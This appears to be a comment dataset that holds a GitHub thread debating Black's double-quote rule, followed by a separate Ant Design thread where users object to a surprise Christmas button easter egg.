	0
0	I'm not a maintainer just an interested user, I respectfully voted down because I think black's power is to annihilate all these small discussions forever. Out of curiosity are there objective reasons that you need to stick with single-quotes?
1	"> are there objective reasons that you need to stick with single-quotes?

It is an approved code style I have to use at work. There are millions of lines of code with single quotes in the existing code base which are not going to be reformatted. I believe this is also the case for other people."
2	"Please discuss the approved code style at work, Black's documentation is using several arguments as to why double quotes are preferred.

If you have strong reasons to prefer single quotes, list them here. ""Approved code style"" is not a reason alone."
3	"The reasons to add single quotes options:

* Black is unusable when contributing to an existing project written with single quotes
* Python official documentation uses single quotes in code examples
* default __repr__() produces single-quoted string literals for most standard types (dict, list, tuple, str, bytes, namedtuple, etc)
* many popular projects and their docs use single quotes
* PEP proposals mostly use single quotes in code examples
* Guido used single quotes in his latest commits on Github

Let me emphasize - the point is that restricting the quotes variants to only double quotes makes this cool project unusable for a big part of Python programmers. 
"
4	"All your reasons can be summarized like this: ""Black shouldn't have an opinion because other projects don't have an opinion.""

This is [an appeal to authority](https://en.wikipedia.org/wiki/Argument_from_authority) and as such doesn't give us anything actionable to discuss.

I also don't buy the argument that this makes it ""unusable for a big part of Python programmers"". Why? The code is going to still work, programmers may even continue writing their code with single quotes (and let Black convert it as needed).


Note that Black is using a variant of wrapping lines with brackets that isn't even covered as an option in PEP 8. Does this make Black unusable?"
5	"What if a project _has_ an opinion but a different one? Is Black’s intention to change opinions or to be a helpful tool?
"
6	"That is a false equivalence @bofm, projects can obviously be opinionated **and** be helpful. But it may be black isn't for you, no big harm in that right?

For what its worth I don't agree with all black does, but honestly, formatting is such a small pain that I'm 100% ready to outsource the entire concept and accept whatever the community comes up with. It beats hours of bikeshedding. [StandardJS](https://standardjs.com) has a lot of the same forces acting on it in the Javascript world and they've also had to stick to their guns against many who disagree. I use both, and honestly, it's like an hour and its formatting becomes second nature. My pairing-partner and I spent last week with black (I've just activated it as part of CI), and it's fine. Everything is fine. The maintainers of this project listen to reason but not opinions when deciding a direction, what better principles can we really ask for?

As a matter of practicality, if you do want to use black, have you considered not running it against the entire codebase but limit it to specific folders? With a tiered rollout, you can slowly subsume folders instead of having to orchestrate a big all-or-nothing effort."
7	"Option for quotes looks like a simple thing to add to black, if a lot of people argue about that why don't? Why we can have width size option but can't have quote option? Even if you look at the pr it was originally with single quotes by default with argument - it's simpler to type and then switched to double quotes because `'` char can be added and quotes will be swapped to `""` (though now if `""` char added to the string the opposite will happen). Tab width, line width and quotes where the first options that were added to prettier https://prettier.io/docs/en/options.html (though authors claim that it's opinionated code formatter with minimal set of options as black do).

@bofm overall even if black won't accept option and it crucial for your project you can fork black and apply code from https://github.com/ambv/black/pull/75 when it was using single quote, it shouldn't be hard to maintain at least at this point."
8	"Black is both a formatter and a code style. One of the core tenets of this project is that all blackened code looks the same. This is why I will never add configurable soft tab width, or identation with hard tabs.

Having options is a burden to the user and a slippery slope to introduce more and more. Case in point: you're already using `--line-length` as an argument to add something else. The more options, the bigger the need for a configuration file.

We chose to standardize on double quotes because:
* standardizing on one makes sense; and
* standardizing on double quotes makes *more* sense than single quotes.

I mostly wanted the former and didn't care much which quote is going to be the one we choose. Over the course of designing this with @carljm and @zsol, they convinced me that double quotes *are* a better option. So this is what Black does now. Shouldn't it be reassuring to users to know that what Black does is informed by rational arguments?

I didn't hear any arguments here that would tell me why single quotes are preferable. ""This is what we used to do"" doesn't work, Black is bound to be disruptive when adopted. ""It's easier to type"" is something that I myself said and this was debunked (it's not easier on *all* keyboard layouts, and more importantly you can keep typing whatever you want and Black will convert it for you).

I'll keep this open because maybe somebody will appear and communicate clearly why an option for this is required. Unless it's strictly necessary, Black won't introduce it.

PS. While forking is always an option in a MIT-licensed project, I felt like suggesting this on my issue tracker was hostile. I would appreciate you not doing that again."
9	"> PS. While forking is always an option in a MIT-licensed project, I felt like suggesting this on my issue tracker was hostile. I would appreciate you not doing that again.

Sorry, your project is great, I appreciate your work and didn't want to harm anyone with my comments. "
10	Will close this for now. If there's any new evidence of single quotes being preferable over double quotes, we can reopen this and resume discussion.
11	"I use single-quoted strings to indicate internal identifiers (eg. dict keys) and double-quoted strings to indicate human-readable text (exception messages and IO).

Roughly if the string matches  ^\w+$ I would not enforce double quotes."
12	"I think this is a really cool project, I hate double quotes though, and more than just typing double quotes, I don't like reading double quotes, quotes are just noise, and I actually really like javascript where you don't have to use quotes at all for dict keys e.g.

```js
const dict = {
    fruits: ['apple', 'orange'],
    veggies: ['carrot', 'turnip'],
}
```
so single quote is the closest I can get in python to minimizing that noise. When your editor does syntax highlighting, you can easily see what is a string and what isn't.

I read the entire discussion and know you are highly unlikely to change your mind on this, but I want to still voice my opinion."
13	"### 1. Another argument

Coupled with [**@bofl arguments**](https://github.com/ambv/black/issues/118#issuecomment-379898677).

Syntax highlighting is corrupted for some text editor syntaxes.

### 2. Example

I use [**PythonImproved**](https://github.com/MattDMo/PythonImproved) syntax for Sublime Text.

Part of my `SashaPythonImproved.py` file:

```python
SITEMAP = {
    'format': 'xml',
    'priorities': {
        'articles': 1,
        'indexes': 0.5,
        'pages': 0.5
    },
    'changefreqs': {
        'articles': 'always',
        'indexes': 'weekly',
        'pages': 'always'
    }
}
```

![Expected](https://i.imgur.com/T7RMQ1y.png)

Black format this code to:

```python
SITEMAP = {
    ""format"": ""xml"",
    ""priorities"": {""articles"": 1, ""indexes"": 0.5, ""pages"": 0.5},
    ""changefreqs"": {""articles"": ""always"", ""indexes"": ""weekly"", ""pages"": ""always""},
}
```

![Actual](https://i.imgur.com/X4tp4d4.png)

Thanks."
14	this makes me sad :(
15	Could we please have more discussion about this? This the single pain point that prevents us of adopting black at work :(
16	"I'd rather have all the quotes be unified than have them be single quotes. I think this is a reasonable default. 

@roganov this is not a reason to not use Black. "
17	@kennethreitz For new projects, yes. For existing ones that use single quotes, converting all quotes to double quotes is sometimes is not an option.
18	@zsol, why are double quotes better than single quotes?
19	@alanhamlett, is the explanation in the README insufficient?
20	Yes, it's insufficient. You should follow [Prettier's example](https://prettier.io/docs/en/options.html#quotes) and allow configuring this tiny little quote thing instead of blocking massive amounts of teams from using it.
21	"> I'd rather have all the quotes be unified than have them be single quotes.

I agree, but only within the scope of a project or organization.

Overall, this conversation is bikeshedding and @ambv should just allow configuring quote style."
22	"Hi @ambv! I totally love black. Thank you so much for this! I, personally, would love it more if using single quotes was configurable (just like line length).

I had wanted to voice my opinion here before as well but didn't really know how to articulate it and provide a reasoning for my choice. But today someone on HN explained it the way I think about using single quotes:

> A double-quote is more noisy than a single-quote, and W is more noisy than V.
The difference is that "" and ' are equally usable options in the context we're talking about. Quotes are very common, so the visual noise adds up when your screen is full of quote marks. Given that they mean the same thing, and one is both harder to type and harder to read, it makes sense to prefer the other.

Link to the HN comment: https://news.ycombinator.com/item?id=17158110"
23	"Double quotes are needlessly noisy. That's easy enough to see when you take a look at two ways to write an empty string: `''` vs `""""`.

Plus the python interpreter seems to prefer single quotes:
```
>>> ""string""
'string'
```"
24	"To everybody that respectfully voiced their opinion here and voted for some of the existing comments, thank you.

@alanhamlett, please revisit your language choices.  Even if you were right in your opinion, the way you voice it makes it hard for others to treat you seriously.

Calling a conversation childish because you disagree with the other side of the argument is unnecessarily escalating the situation.  Accusations of ""blocking massive amounts of teams"" is hyperbole and unfair.  Telling unpaid maintainers of an open source project what they ""should"" do is arrogant.  You have no skin in this game and are in no position to demand any action.

With this out of the way, let me summarize my position.

Black as a code style is an attempt at a strict subset of PEP 8 which doesn't leave much up to debate.  A ""code style: black"" badge on a repo should be enough to tell the reader *exactly* what they can expect from the code inside.  The first configurable styling option would be the foot in the door that would be used to demand more configurability.  This is why Black will never have an option to choose single quotes over double quotes.

What I'm still pondering is if Black should have an option to omit enforcement of styling of string quotes.  That would allow projects to adopt it a bit more incrementally.  I'm open to arguments in support of this idea.  I mostly worry about getting more requests for options to disable other parts of Black in the future."
25	"I’m confused by the “double quotes means I can’t use it” statements, if there are concrete arguments (not opinions) or specific use-cases that exemplify this problem I think that’s valuable to bring up in this thread. But, honestly and with respect, I’m not at all persuaded by opinion pieces. “Because it’s our standard”, “I hate double quotes”, “double quotes hurts many teams”, these aren’t arguments. We must be rigorous in our thinking!

My experience with black is that we rolled it out piecemeal, targeting certain folders in one project. After some experimenting the entire project ended up included. And it was fine. I don’t agree to all black’s decisions, none of us at the office did, but we DID agree it’s so much easier to not have bikesheddy formatting discussions.

I respect ambv’s commitment to his original vision of a no-nonsense linter. The javascript community has StandardJS (which also draws ire over its quote choice), I’m above all else happy to see a strong voice emerging for Python and will support that over specific quote style. Thank you for your work, whatever decision you feel is best going forward👌 "
26	"I would love to replace my use of ``yapf`` with ``black``. Python is missing a standard code formatter.

I'd like to add a specific argument in favor permitting configuration here (see also @bofm's [list above](https://github.com/ambv/black/issues/118#issuecomment-379898677) and @kennethreitz 's widely-adopted [PEP8 amendment](https://www.kennethreitz.org/essays/if-i-could-amend-pep-8)): typing a single quote takes fewer keystrokes when using the standard keyboard layouts in the US, UK, and China. It takes the same number of keystrokes on standard layouts in Germany and France. I know of no keyboard layouts which make it easier to type double quotes.  

This is an excellent project. I look forward to seeing it develop."
27	@ariddell that's definitely a reasonable concern that has come up during development. We realized that we can just keep typing single quotes and let black correct it automatically. Would you agree this is a reasonable workflow? 
28	"@ariddell 
The argument is, type in single quotes, and let black auto-format to double quotes, so it doesn't matter that its harder to type doubles.

I don't think any argument can be made to sway the maintainer. I was very excited about `black`, and looked forward to ""prettier in python"", but this is a deal breaker. I don't want double quotes in my code and I will *never* user black or advocate for it without a single quotes option. My argument to the maintainer is this, if you want the whole community to use this product and be happy, allow this option.

If you don't, I guarantee someone will just fork this and add in single quotes and just merge changes from this upstream repo. And to clarify this wouldn't be a hostile fork or takeover or something, it would just be an alternate repo for the people who will never agree with you on this."
29	"If I run Black on a code base I work on, 95% of the changes it makes are just changing single quotes to double quotes. Unfortunately, that amount of noise makes it hard to see what meaningful changes it is making and whether they are on the whole positive or negative.

I'm not sure about the arguments for using double quotes either. There are always going to be times when you need to use the other type of quote in a string, and examples involving double quotes include working with JSON or HTTP headers. I'm not sure it's a bad thing to use double quotes for docstrings and single quotes for everything else either – some visual distinction between the two may well be perceived as a good thing."
30	"Reasonable arguments in this thread, by appearance:
1) [Single quotes are easier to type.](https://github.com/ambv/black/issues/118#issuecomment-379994355)
2) [Single quotes make less noise.](https://github.com/ambv/black/issues/118#issuecomment-382381572)

Thats it. Two. All other statements are just an opinion or lack a logical reasoning.
1) already pointed out [here](https://github.com/ambv/black/issues/118#issuecomment-392257425) is not true for everybody.
2) is the only thing i can see to be true for everybody because it is always better to have less clutter on your screen.

@ambv: [""standardizing on one makes sense,  standardizing on double quotes makes more sense than single quotes""](https://github.com/ambv/black/issues/118#issuecomment-380171356) and all the text around that also do not contain a single reason **why** they make more sense, exactly what you criticize when others post statements without a valid point of argument. Only saying something makes more sense is not a proper argument.
Standardizing can make sense to not have two different characters for the same thing, but using `'` and `""` in the same code could also have positive effects. you can distinct keywords from actual strings for example. This could be a reason to use both.

In the readme file it says:
""If you're paid by the line of code you write, you can pass --line-length with a lower number. ""
This is totally unreasonable and strictly against your own rules. (You even linked [this](https://en.wikipedia.org/wiki/Argument_from_authority) yourself in this thread.)
You dont want to add an option for a quote setting which i totally understand and it makes sense for black to not have that, because black is not making any compromises. But why is there a line width option then? Can you name a reason to have an option for that setting that can not be said for the quotes? Otherwise it would just be inconsequent and one could argue: ""I get less paid for every `'`, so we need an option to have single over double quotes.

Please also do not forget that it is not the number of arguments that counts but their total weight.


Thank you for your work, this is a great tool and I dont want to sound disrespectful in any way, Im just good at nipicking :)"
31	"Hi.  I'm one of the opinionated people who commented on the Hacker News post.  I came over to see what might be happening here, and discovered there has already been quite a bit of debate on this topic.  

In what I hope will be a helpful gesture (and because I apparently have nothing better to do on a Saturday night :) ), let me try to gather all the arguments I can find in one place.  This is the one issue that is open, so I hope this is the right place.

I should acknowledge that I have a personal preference. Therefore, I will do my best to step back from that preference, and first summarize *all* the arguments while trying to be as neutral as possible.  I will confine my own evaluation of these arguments to a separate comment.

Here we go!

### All the arguments, organized by source

[README.md](https://github.com/ambv/black/blob/master/README.md)

- Using double quotes avoids having to escape ASCII apostrophes.
- PEP 257 says to use triple double quotes for docstrings.
- In some fonts, an empty string in single quotes is hard to distinguish from one double quote.
- C strings are written with double quotes.
- Single quotes are easier to type on many keyboards.

#51

- Single quotes are easier to type on many keyboards.
- Docstrings generally use triple double quotes.
- In some fonts, an empty string in single quotes is hard to distinguish from one double quote.
- C strings are written with double quotes.
- repr() defaults to single quotes.
- Many popular open source Python projects use single quotes.

#75

- When you have a series of English strings, some of which contain ASCII apostrophes, it is more consistent to format them all with double quotes than to format some with single quotes and some with double quotes.
- If an English string is formatted with double quotes, then you can insert an ASCII apostrophe without having to escape it or change the quotes.
- PEP 257 says to use triple double quotes for docstrings.

#118

- Some projects and workplaces require single quotes as their style.
- Python official documentation uses single quotes in code examples.
- The interpreter and repr() use a specific quoting style (single quotes except for strings containing single quotes).
- PEP proposals mostly use single quotes in code examples.
- Guido tends to use double quotes for human-facing strings, single quotes otherwise.
- Some programmers use single and double quotes to express two kinds of strings.
- Single quotes create less visual noise for readers.
- Using double quotes breaks syntax highlighting in Sublime Text.
- Kenneth Reitz's [PEP 8 amendment](https://www.kennethreitz.org/essays/if-i-could-amend-pep-8) recommends the repr() way (single quotes except for strings containing single quotes).

[Hacker News](https://news.ycombinator.com/item?id=17151813)

- Python official documentation prefers single quotes.
- The standard library prefers single quotes.
- The repr() way of formatting strings is what people see in the interpreter.
- Programs that generate Python code tend to use repr() and produce output formatted that way.
- The repr() way was devised a long time ago and is the least inventive solution.
- In sh/bash, single quotes are for string literals without variable expansion or other substitution.
- Some programmers use double quotes for human-facing strings, single quotes otherwise.
- Double quotes create more visual noise.
- Double quotes require double keypresses on the most common keyboard layouts.
- Double quotes are used to quote strings in English prose.
- Double quotes are easier for strings that contain ASCII apostrophes.
- Single quotes are easier for strings that contain double quotes.
- Other popular programming languages write string literals always with double quotes.

I think that's all of them.  Let me know if I missed any and I'll be glad to update this!

### Arguments organized into categories

Now, a more organized list, with duplicates merged.  A few of these involve quantifiable measures, so I've collected and added the data here.

A. The Python language

1. The Python official documentation mostly uses single quotes. [Python 3.6: 80% to 20% of occurrences]
2. The Python standard library mostly uses single quotes. [Python 3.6: 74% to 26% of occurrences]
3. The repr() way of formatting strings is what people see in the interpreter.
4. The repr() way was devised a long time ago and is the least inventive solution.
5. PEP 257 says to use triple double quotes for docstrings.

B. Common practice

1. Many popular open source Python projects use single quotes. [not quantified]
2. Some workplaces require single quotes as their style. [not quantified]
3. PEP proposals mostly use single quotes in code examples. [not quantified]
4. Guido tends to use double quotes for human-facing strings, single quotes otherwise.
5. Docstrings generally use triple double quotes.
6. Kenneth Reitz's [PEP 8 amendment](https://www.kennethreitz.org/essays/if-i-could-amend-pep-8) recommends the repr() way.
7. Some programmers use double quotes for human-facing strings, single quotes otherwise.

C. Tooling

1. Using double quotes breaks syntax highlighting in Sublime Text.
2. Programs that generate Python code tend to use repr() and produce output formatted that way.

D. Readability

1. In some fonts, an empty string in single quotes is hard to distinguish from one double quote.
2. Single quotes create less visual noise for readers.
3. Using double quotes avoids having to escape ASCII apostrophes.
4. Using single quotes avoids having to escape double quotes.
5. Given a series of English strings, some of which contain ASCII apostrophes, it is more consistent to format them all with double quotes than to format only the ones containing apostrophes with double quotes and the rest with single quotes.

E. Writability

1. Single quotes are easier to type on common keyboard layouts.  [This is true for US and UK standard keyboards and some European keyboards.  For all the rest of the Latin alphabet keyboard layouts on Wikipedia, both types of quotes require the same number of keypresses; for no layouts are double quotes easier than single quotes.]
2. If an English string is formatted with double quotes, then you can insert an ASCII apostrophe without having to escape it or change the quotes.

F. Other languages

1. C strings are written with double quotes.
2. In sh/bash, single quotes are for string literals without variable expansion or other substitution.
3. Double quotes are used to quote strings in English prose.
4. Other popular programming languages write string literals always with double quotes. [C#, Java, ...?]


"
32	FWIW the preferred character for an apostrophe (’) works fine in both types of quotes. (Yes, you may not bother to use it, but it’s not correct to say apostrophes can only be used in double quotes either.)
33	@reupen Ok, updated to clarify.
34	"Single quotes are the dominant style in Python. Maybe it would be worth collecting some data to back that up with numbers, say, grabbing the 1000 most downloaded PyPI packages and running stats on their source.

Another way to think about it is this: If the situation was reversed, with Black enforcing single quotes, could you imagine this many people coming in droves to vote and comment and ask for a change? (Lucky for you, this project has done it both ways, so you actually have real data to compare!) You're really going against the grain here."
35	"> could you imagine this many people coming in droves to vote and comment and ask for a change?

This is invalid logic. Most people are happy with the current behavior or indifferent to it. They don't open issues or find existing ones to comment about how they're content with the current situation."
36	"@zestyping, hi, I saw your comments on HN. Thanks for your work on Python in the past! I'm bundling lib2to3 in Black so in fact I ship some code you wrote :-)

> Python official documentation prefers single quotes.

> The standard library prefers single quotes.

This is not true. There is more of single quotes but there is no recommendation of one over the other, let alone enforcement. I am pretty sure that most authors don't care either way so counting percentages provides less information than you'd like."
37	"> Guido tends to use single quotes. [not quantified]

I spoke to him about this so I know this is not true either. He says he prefers double quotes for human-readable text and single quotes for data."
38	"> Using double quotes breaks syntax highlighting in Sublime Text.

This makes me sad. This should not be used as an argument in favor of single quotes. It's a bug to be fixed instead."
39	"> 
>     Using double quotes breaks syntax highlighting in Sublime Text.
> 
> This makes me sad. This should not be used as an argument in favor of single quotes. It's a bug to be fixed instead.

never noticed this bug. (I use MagicPython on sublimetext)"
40	"@ambv I was trying to write the statements neutrally.  By ""prefers"" I just meant they have a significant majority of one type, which is an objective measurement.  I've updated to use more objective wording (""mostly uses"").  I'll update the statement about Guido, thanks for finding that out!

And yes, I personally dismiss the Sublime Text argument also.  But I am reserving my opinions for a separate comment; I was trying to list all the arguments without stating any opinions yet.  I will soon :)"
41	"> Double quotes create more visual noise.

If that were true then written English prose wouldn't standardize on using them for citation. In fact, double quotes predate single quotes, suggesting that the visual distinction has a practical root.

When I see this argument, I wonder if it doesn't come from badly designed fonts more than anything else. After all, what is the unit of visual noise? What's the numeric difference in visual noise between the quotes? Even if we could answer those silly questions, I bet the delta in noise is miniscule, similar to how M is more noisy than N and commas are more noisy than periods."
42	"I give very little weight to arguments based on precedent in existing code (including PEP8, popular PyPI projects, the Python REPL). Black is (AFAIK) the first Python autoformatter to standardize quotes, and the considerations for auto formatting are different than for hand-formatted code, so there is no relevant precedent. 

Personally I use mostly single quotes in hand formatted code (single quotes for “machine strings”, double for human-readable), but this is not a heuristic that can reasonably be implemented by an auto formatter, and given the limitations of automatic quote enforcement, I think double quotes are the better choice.

The “how hard is it to type” consideration carries much less weight with auto formatting (because you can type whatever you like and let Black convert, just like you no longer need to worry about manually breaking lines as you type), and the maintainability issues with inconsistency resulting from human readable strings with embedded single quotes are more serious. Nobody would hand format a list of UI strings with inconsistent quoting based on the incidental presence or absence of an embedded single quote (unless they were allowing a strict style guide to overrule their better judgment) but this is what Black would have to do. "
43	And absent data, I consider “double quotes are visually noisy / hard to read” to be a subjective aesthetic preference that carries zero weight. 
44	Another data point: Every single string in the text of PEP 8 either uses single quotes, or is a triple-quoted docstring.
45	@o0i1 that is a description of what is used right now, not an argument why it should be used. Why are there so many people here that cant tell that difference?
46	"A naive attempt to answer this using data. Many caveats apply, this is a dumb count of occurrence of quotes in `.py` files in the 100 most downloaded packages off of pypi.

https://gist.github.com/kadrach/6b8911234d94a928fc999710b7ff0e4c

```
Density plot of quote bias in top100 packages.
Bias calculated as num_single/(num_single+num_double)
    ++----------+----------+----------+-----------+----------+-+
    |                                 **********               |
    |                               **         **              |
    |                             ***            **            |
1.5 +                            **               **           +
    |                           **                 **          |
    |                          **                   *          |
    |                         **                     *         |
  1 +                        **                      **        +
    |                       **                        **       |
    |                     ***                          **      |
    |     ******         **                             **     |
0.5 +  ****    ***** *****                               ***   +
    |  *           ***                                     **  |
    ++----------+----------+----------+-----------+----------+-+
     0         0.2        0.4        0.6         0.8         1
```

This does look like a clear preference of one style over the other, but as mentioned before, many caveats apply (e.g. counting vendored code, potentially counting generated code, selection bias in top100 packages, etc)."
47	"@kadrach, this is interesting. Your counting method is invalid though, it counts apostrophes within other strings and comments. Please use an AST.

Could we do Top 1000 instead and only count within unique files? "
48	"@ambv Agreed, I was trying to avoid the work of doing this via an AST. I do wonder how much quotes contained within quotes would affect the outcome. I did deliberately want to include comments as ""part of the code"".

I'm not sure I understand counting within unique files. I would like to exclude vendored code, but then the problem of how to identify vendored code arises."
49	@kadrach Counting only unique files would solve the vendoring problem for the most part as vendored code is usually copied in-place.
50	@SethMichaelLarson I'm not quite clear on how to achieve this. How do you determine which project a file is attributed to? Has `someproject` vendored `pip`, or has `pip` vendored `someproject`? Counting only files unique across all projects would weight the counts heavily, disregarding packages that are more commonly vendored (perhaps pip as an example?). 
51	I'm not sure this needs that level of detail, more to protect over-accounting for packages like urllib3 which is commonly vendored and which is also previously vendored by requests which is ALSO commonly vendored. :P
52	"That's true, but we *do* need to count e.g. requests individually. If we only use unique files, choices that requests has made will be discounted (given most of the ""requests"" files will be non-unique and ignored); and requests is likely to be among the top packages."
53	"Create a dict where the key is the sha1 of the file content and the value is the file content. Download all packages first while building this dictionary. Later you can use black.lib2to3_parse() to get the CST of the content, subclass black.Visitor to pluck out all strings and check the opening few characters to classify the string.

It doesn't matter which package a file comes from. It's super unlikely for unrelated files to match hash-wise so you're not ""discounting"" requests, you're just counting it once. In fact, you'll count it more than once since some vendored libs will be outdated. But that's a way better approximation than your first attempt."
54	"I think I still need to retain a project to file association, to determine a ""quote style choice"" at project level."
55	"No, that would unreasonably bump the value of a ""style choice"" for projects with small codebases compared to projects with many files. We don't care what a ""project"" chose, we care what *all of the unique source code* in the top 1,000 projects is using."
56	"Weighting by number of files would bump projects with many little files over projects that opted for a smaller number of larger files. That seems unreasonable. Perhaps by number of lines? 

My original intent was to figure out what the ""unspoken standard"" choices of the topmost projects are, not what *all of the unique source code* is using - I'm not convinced of that measure. "
57	The biggest issue for me is that, for the people who use single quotes only as identifiers, running Black on a codebase actually _loses_ information. It's not AST information, but it's information in the sense that a code comment is information.
58	"> For the people who use single quotes only as identifiers, running Black on a codebase actually loses information.

@landtuna, while I am skeptical if such scheme can be rolled out consistently, I acknowledge this is a problem."
59	"The strongest argument in this thread for providing an option to not change quotes for strings (except for docstrings, which should always be """""" per [PEP 257](https://www.python.org/dev/peps/pep-0257/#what-is-a-docstring)) is that many people (including Guido) use quote style as a [""extra-terse comment""](https://github.com/ambv/black/issues/90#issuecomment-383255532) to convey meaning, with single quotes meaning ""data"" and double quotes meaning ""human-readable string"".

I checked through my code and found I do the same thing without ever consciously deciding on that. I suspect this is common. I think this is actually why standardizing on double quotes bugged me (and perhaps other people?) so much and I couldn't explain why."
60	@kbd, agreed, this is the most convincing argument for allowing Black to optionally skip normalizing quotes [as I suggested a few days back](https://github.com/ambv/black/issues/118#issuecomment-392240828). That would cover all people unhappy with double quote enforcement.
61	"you mean something like that ?

``` python
['my_key'] = ""my string""
```
instead of
``` python
[""my_key""] = ""my string""
```"
62	"@ambv I'm strongly voting for single quotes as approved code style. I've seen this at a lot of companies and discussed several times at different meetups. It is a widely spread practice to use single quotes for everything that is a code and double quotes for doc strings.

In fact, this is very useful in IDEs and editors where one could differentiate in-code strings and doc strings between each other via defining different coloring for them.

Honestly, I was a bit shocked after black converted all single quotes to double quotes resulting in much less readable code in an IDE."
63	"@ambv What do you think about an enforced quote style of ""strings containing no whitespace are single-quoted while strings with whitespace get double quotes""? That would be a consistent style (i.e. the same file would always have the same output) that may produce the smallest delta from how many people actually prefer to write Python.

I could definitely see adopting that enforced style, whereas I would personally never want to use forced double-quotes."
64	"@kbd sounds like something that is the best from different worlds. This should work for the case with `' for code, """" for docs` and also `' for data, """" for human-readable values` most of the time. A nice trick as for me."
65	For another data point: My team is about to reformat all our code with black. We've always used single quotes. We've got some very experienced Python folks. Everyone is fine with it.
66	"@harveyr yeah us too.

I’m fine w. whatever, including a toggle-option that we as a community can possibly discuss and revisit in due time. Perhaps a toggle option really is the suitable solution to not fracture whatever community this project is accumulating. 

Still not sure what makes us so different from StandardJS that does insist on a unified quote style 🤷‍♂️ But I also don’t subscribe to the “public strings as double-quotes” strategy, it’s much too fragile for my tastes (I’d push public strings through a translation function before using semantically meaningless quotes)
"
67	"> What do you think about an enforced quote style of ""strings containing no whitespace are single-quoted while strings with whitespace get double quotes""?

@kbd, I find this curious but too magical :)"
68	"> But I also don’t subscribe to the “public strings as double-quotes” strategy, it’s much too fragile for my tastes (I’d push public strings through a translation function before using semantically meaningless quotes)

The discussion hasn't been about ""public"" strings, but ""human-readable"" strings (i.e. natural language vs code). It's not necessarily about *user-facing* strings. For example, the vast majority of all (non-docstring) quotes in my code are single quotes because most strings in code are data (dictionary keys, names of things, shell values, filenames, etc.), but things like log messages and exception strings get double quotes. As far as ""semantically meaningless"" goes, many people in this thread have already explained the meaning they assign to different quotes.

> I find this curious but too magical :)

Not arguing with you (since that's not an argument ;) but what if that small heuristic corresponds to what most people actually do and expect when reading Python code? What if in practice that results in the least disruption on existing codebases? What if it allows a fully-automated/consistent style that can be used by people who would otherwise reject double quotes everywhere? Would it be worth consideration?

Edit: I'd imagine this formatting would even catch bugs. ""Why did this dictionary key / filename get double quotes? Oops there's a space""."
69	"One more argument to make it more configurable than it is now, is that ""git blame"" becomes of less use for older commits, as the majority of the changes black does on our code is changing quote style from single to double"
70	"@ikatson, agreed. In general, I should add this to the README:

- you can use `git hyper-blame` and/or `git blame $BLACK_REV^ -- $FILE` to skip over the formatting commit

That is useful beyond the string quotes."
71	"Resolution: 18.6b0 has --skip-string-normalization, or -S for short. This allows existing projects to adopt Black with less friction and works for all alternative string quotes policies.

Black still defaults to and recommends normalizing string quotes to double quotes everywhere as we believe this is a better default than single quotes, and is enforceable unlike the [""single quotes for data, double quotes for human-readable strings""](https://stackoverflow.com/a/56190) policy.

I hope this resolves to your satisfaction what's been the most controversial issue in Black's history."
72	"You can override the css : )
```less
.ant-btn.ant-btn-primary.christmas:before {
  display: none!important;
}
```"
73	This _might_ be ok for such a widely used application if it was at least opt-in... I cannot use this library professionally with this applied, and it is unfortunate that I had to scour source code to find it...
74	Are there any other Easter eggs like this within Ant? I want to be sure I'm overriding them in my application.
75	I really want to use Ant for future projects but decisions like this concern me. I imagine some poor developers are going to have their Christmas day interrupted when they get an angry email from their managers asking to remove the snow from all the buttons.
76	"it's not fun at all... 

at least there should be some config to disable it, not override the style!!!"
77	"~~We will make 00aebeb9756afecc884ad48486084836b9a2707a optinal in next patch version, there is a potential ConfigProvider API without any date judgement condition, and the default value of `snowyButton` would be `false`.~~

```jsx
<ConfigProvider snowyButton={true}>
  ...
</ConfigProvider>
```

Also, Merry Christmas to everybody~ 🤶🏻

---

Removed the egg in `antd@3.11.6` now."
78	"I would not recommend overriding CSS. All buttons come with ""Ho ho ho!"" title. If you remove the snow, title will pop up when you hover on the button. And it cannot be removed with CSS. You'll need to edit DOM. At least with the snow it will be more obvious that it's an easter egg and more acceptable for users than a normal button with ""Ho ho ho!"" title."
79	Easter egg should be disabled by default in production mode.
80	"怎么去掉
```
title=""Ho Ho Ho!""
```
?
@zombieJ 
@afc163 "
81	怎么去除
82	我们是做2B应用的，这种“彩蛋”让人有失控的感觉。翻了下过去的release里也没有提到过这个彩蛋，看起来是故意为之。但用户如果有意见，我们就被动了。加彩蛋可以，但最好控制权还是在开发者手里，默认关闭，由开发者决定是否开启。开发者给最终使用者的惊喜叫“彩蛋”，框架给开发者的惊喜就是惊吓了……
83	So foolish！！！
84	💔
85	吓我一跳，没有 任何 说明 突然 来这么一下
86	"This is ridiculous! We are running serious business using Ant.Design.

If Ant.Design is designed as ""library"", how and when to present an Easter egg should be controlled by the application developer, not the library.

Christmas is a happy day, but not for every business."
87	吓死宝宝了！
88	"所谓“彩蛋”就是不会事先通知的。

我觉得雪花如果使用能够使用更高融合度的设计，也许更多人能一笑置之，毕竟没有什么不良影响。或许还能获得好评，毕竟skin这个概念是有的。可惜现在扁平的界面里那块3D雪。。。
但是改写 title 完全没必要，仿佛像是恶作剧了。"
89	可以让开发者配置就好了， title 完全没必要
90	"~没有女朋友，一觉醒来还要被喷，我已经隔着屏幕体会到那种弱小又无助的感觉了~

实际上发个新版本出来就好了..."
91	希望每个前端都不要被产品经理diss...
92	这次在代码里掺屎，下次就不定搞什么了
93	这种东西 还是觉得 由开发者 去控制 比较好， 根据 实际情况要不要使用， 而不是 被业务 找出问题来。 风格 也不一定试用所有UI, 在某些地方 看着就可能很怪异
94	"产品是面向客户的,所谓的彩蛋并不是所有人都受得了,比如一个比较严肃的场景..用户体验的第一感受是不是系统给植入了部分恶意代码...会觉得是惊喜么?惊吓更多吧...

正如上面有人提到..面对开发者这功能就理应告知,且允许控制.

不是应该由自家的开发者决定是否给自己面向的用户群开放这个功能....这样才比较合理么!!

你已经是个成熟的框架，不用别人教你不该做什么。。。
"
95	应该是可配置，而不是覆盖。
96	个人感觉这个菜单简直太帅了，赞
97	本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。
98	"Please solve the problem as soon as possible。
anyway 控制权应该在我们开发者手里，应该是可配置！而不是完全覆盖！right？"
99	"> 本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。

请做好防御措施"
100	"> 本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。

God Bless you "
101	"> 本来今天高高兴兴的， 没想到还没到公司就被喷，整个群都炸了，说中病毒了。感觉要被杀了祭天。。

稳住，老铁"
102	WTF
103	"> 这次在代码里掺屎，下次就不定搞什么了
666
"
104	心机Boy
